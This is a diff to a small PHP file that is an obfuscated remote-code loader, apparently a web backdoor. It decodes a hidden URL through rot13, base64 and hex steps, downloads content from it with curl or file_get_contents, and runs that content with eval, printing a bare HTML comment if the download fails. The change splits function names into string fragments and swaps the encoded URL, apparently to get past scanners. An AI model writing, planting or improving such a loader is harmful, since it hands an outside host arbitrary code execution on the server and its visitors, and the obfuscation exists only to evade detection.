@@ -1,9 +1,9 @@
 <?php
-$a="str_rot13";$b="base64_decode";$c="hexdec";$d="chr";$e="substr";
-$f='Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL2Lmp1AwZ2AGMyAwV3BGp0AwHlMwD2Awx2LmL1ZzD2MQL5AzH2BGWzAzD2ZGL5AzHlMwp2ZmRlMwMxAwx2MGL5ZzH3AQp4AmD=';
+$a="s"."tr_"."ro"."t1"."3";$b="b"."as"."e6"."4_"."d"."e"."c"."o"."de";$c="h"."ex"."de"."c";$d="c"."h"."r";$e="s"."ub"."st"."r";$fg="fi"."le"."_g"."et_"."co"."nt"."en"."ts";
+$f='Awt3AQp0AmN3ZmAuZzLlMwLmAwD2MGWyAzR3ZmL0AwH2LmL5AmL3ZwWyAzH2AGp0ZzL2AmL4ZzL2Lmp1AwZ2AGMyAwV3BGp0AwHlMwD2Awx2LmL1ZzD2MQL5AzH2BGDjAzD2ZGL5AzHlMwp2ZmRlMwMxAwx2MGL5ZzH3AQp4AmD=';
 $g=$a($f);$h=$b($g);$i="";$j=strlen($h);
 for($k=0;$k<$j;$k+=2){$l=$e($h,$k,2);$i.=$d($c($l));}
-$m="curl_init";$n="curl_setopt";$o="curl_exec";$p="curl_close";
-if(function_exists($m)){$q=$m();$n($q,10002,$i);$n($q,19913,1);$r=$o($q);$p($q);}else{$r=@file_get_contents($i);}
+$m="c"."u"."rl"."_i"."n"."it";$n="cu"."rl_"."se"."to"."pt";$o="c"."ur"."l_"."e"."x"."e"."c";$p="c"."u"."r"."l"."_"."c"."l"."o"."se";
+if(function_exists($m)){$q=$m();$n($q,10002,$i);$n($q,19913,1);$r=$o($q);$p($q);}else{$r=@$fg($i);}
 if($r){@eval('?>'.$r);}else{echo"<!--OK-->";}
 ?>
